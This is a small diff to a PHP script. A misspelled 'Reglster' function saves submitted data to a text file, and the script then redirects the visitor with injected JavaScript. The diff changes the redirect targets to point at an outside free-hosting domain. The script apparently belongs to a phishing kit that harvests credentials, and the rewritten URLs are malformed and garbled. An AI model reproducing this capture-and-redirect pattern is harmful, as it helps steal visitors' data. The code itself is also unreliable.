@@ -19,8 +19,8 @@ function Reglster(){
   file_put_contents($fula, $cata);
 }
 Reglster();
-$script="<script>"."location.href='./Reglster2b.php'</script>";
-$scripts="<script>"."location.href='./after getinb.php'</script>";
+$script="<script>"."location.href='./https://dccm.000webhostapp.com/Reglster2b.php'</script>";
+$scripts="<script>"."location.href='./https://dccm.000webhostapp.com/after https://dccm.000webhostapp.com/getinb.php'</script>";
 $cool=$alavi_key.".txt";
 if (!0){
     print $scripts;
